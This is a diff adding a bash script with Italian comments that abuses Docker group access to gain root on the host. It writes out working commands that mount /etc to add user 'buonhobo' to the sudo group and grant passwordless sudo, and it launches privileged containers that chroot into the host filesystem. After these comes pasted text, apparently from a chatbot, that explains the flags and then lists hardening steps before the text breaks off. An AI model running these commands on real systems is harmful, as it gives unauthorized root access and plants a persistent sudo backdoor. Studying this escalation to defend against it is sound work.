@@ -1,0 +1,74 @@
+#!/bin/bash
+
+# This adds buonhobo to sudo group
+docker run -v /etc:/ciao alpine sh -c "sed '/sudo/s/[a-z,]*$/buonhobo/' -i /ciao/group"
+
+# This lets buonhobo use sudo for everything with no password
+docker run -v /etc:/ciao alpine sh -c "echo 'buonhobo ALL=(ALL) NOPASSWD: ALL' >> /ciao/sudoers"
+
+#chatgpt propone
+
+#Puoi avviare un container con privilegi completi sul sistema host. 
+
+docker run -it --privileged --pid=host --net=host -v /:/host alpine chroot /host sh
+
+# --privileged: Concede al container tutti i privilegi.
+# --pid=host: Condivide lo spazio dei processi con l'host.
+# --net=host: Condivide la rete con l'host.
+# -v /:/host: Monta l'intero file system dell'host nel container (sotto /host).
+# chroot /host sh: Cambia il root directory del container al file system montato e avvia una shell (sh).
+
+
+
+
+
+
+docker run --rm -v /:/mnt --entrypoint /bin/bash alpine -c "chroot /mnt bash"
+
+
+
+ Per proteggere il sistema da queste vulnerabilità:
+
+    Rimuovere l'accesso non autorizzato al gruppo docker:
+        Rimuovi utenti non fidati dal gruppo docker.
+grep docker /etc/group.
+
+    Limitare l'accesso al socket Docker:
+        Assicurati che solo utenti autorizzati possano accedere a 
+/var/run/docker.sock.
+
+    Utilizzare rootless Docker:
+        Configura Docker in modalità "rootless" per minimizzare l'accesso al sistema host.
+
+    Audit dei permessi del container:
+        Usa strumenti come AppArmor, SELinux o seccomp per limitare i privilegi dei container.
+
+
+Ottimo, è importante studiare queste tecniche per migliorare la sicurezza dei sistemi! Capire come un attaccante potrebbe sfruttare una configurazione insicura ti permette di proteggere meglio i tuoi server. Ecco alcune raccomandazioni aggiuntive e buone pratiche per la sicurezza legata a Docker e alla gestione dei privilegi.
+1. Approfondimenti sulla sicurezza di Docker
+Minimizzare i permessi degli utenti
+
+    Controlla gli utenti che fanno parte del gruppo docker:
+
+grep docker /etc/group
+
+Rimuovi gli utenti non necessari con:
+
+    sudo gpasswd -d username docker
+
+Disabilitare l'accesso al socket Docker
+
+    Modifica i permessi di /var/run/docker.sock per limitarne l'accesso:
+
+    chmod 660 /var/run/docker.sock
+    chown root:docker /var/run/docker.sock
+
+    Considera di spostare l'accesso al socket su un sistema di gestione basato su API sicure.
+
+Utilizzare Docker in modalità rootless
+
+    Installa Docker in modalità rootless per eseguire i container senza richiedere privilegi di root.
+        Segui la documentazione ufficiale: Rootless Docker
+
+2. Proteggere il sistema host
+Abilitare AppArmor o SELinux
